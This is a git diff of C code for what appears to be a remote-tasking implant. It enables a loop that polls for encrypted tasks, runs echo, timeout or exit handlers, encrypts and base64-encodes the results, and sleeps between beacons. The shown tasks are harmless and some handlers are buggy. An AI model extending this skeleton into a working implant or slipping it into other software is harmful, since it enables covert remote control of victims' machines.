@@ -115,6 +115,7 @@ int get_task(keyMat * km,TaskBytes* tb){
     memset(tb,'\0',sizeof(TaskBytes));
     memcpy(tb,db.plain_text,db.len);
     DEBUG_PRINT("tasking: %s",(char*)tb);
+    DEBUG_PRINT("%u",tb->task_num);
 
 
     free(eb.cypher_text);
@@ -139,19 +140,20 @@ int send_result(keyMat * km, TaskBytes* tb){
     int offset = 0;
     if (!km || !tb) goto fail;
 
-    db.len = sizeof(taskBytes)+tb->len;
+    db.len = 32+tb->len;
     db.plain_text = (uint8_t*)tb;
-
+    
+    DEBUG_PRINT("encrypting result");
     //encrypt it 
     enc(&eb, km, &db);
-
+    DEBUG_PRINT("sequencing bytes");
     offset = sizeof(EncryptedBytes) - sizeof(uint8_t*)+4;
     memcpy(&eb_inline,(void*)&eb,offset);
     eb_inline.size = eb.len + sizeof(EncryptedBytes);
     eb_inline.memory = (uint8_t*) malloc(eb_inline.size);
     memcpy(eb_inline.memory,&eb,offset);
     memcpy(eb_inline.memory+offset,eb.cypher_text,eb.len);
-
+    DEBUG_PRINT("base 64ing");
     //base64 it
     b64_tb.memory = base64_encode((const unsigned char *)&eb_inline,eb_inline.size,(size_t*)&b64_tb.size);
     DEBUG_PRINT("%s",b64_tb.memory);
@@ -167,7 +169,7 @@ fail:
 
 int handleTaskEcho(taskBytes *res,taskBytes *tb){
     DEBUG_PRINT("echo");
-    if (!tb || !res) goto fail;
+    if (!tb || !res || !tb->len) goto fail;
         res = (taskBytes*)malloc(sizeof(taskBytes)+tb->len);
         memcpy(res,tb,sizeof(taskBytes)+tb->len);
         return SUCCESS;
@@ -201,7 +203,7 @@ int main()
     localKeys me;
     keyMat session;  
     TaskBytes task;
-    //TaskBytes response;
+    TaskBytes response;
 
     DEBUG_PRINT("SPITESTORE\n");
  
@@ -220,20 +222,23 @@ int main()
         DEBUG_PRINT("checking for tasking\n");
         if (FAILURE == get_task(&session,&task)) goto next;
         DEBUG_PRINT("tasking: %s",(char*)&task);
-        DEBUG_PRINT("%hu",task.task_num);
-        //  switch(task.task_num){
-        //     case TASK_ECHO:
-        //         handleTaskEcho(&response,&task);
-        //         break;
-        //     case TASK_TIMEOUT:
-        //         handleTaskTimeout(&response,&task);
-        //         break;
-        //     case TASK_EXIT:
-        //         handleTaskExit(&response,&task);
-        //         break;
-        // } 
+        DEBUG_PRINT("%u",task.task_num);
+        switch(task.task_num){
+            case TASK_ECHO:
+                handleTaskEcho(&response,&task);
+                send_result(&session,&response);
+                break;
+            case TASK_TIMEOUT:
+                handleTaskTimeout(&response,&task);
+                send_result(&session,&response);
+                break;
+            case TASK_EXIT:
+                handleTaskExit(&response,&task);
+                send_result(&session,&response);
+                break;
+        } 
        
-        // send_result(&session,&response);
+        
 next:
         DEBUG_PRINT("sleeping %d seconds\n",TIMEOUT);
         sleep(TIMEOUT);
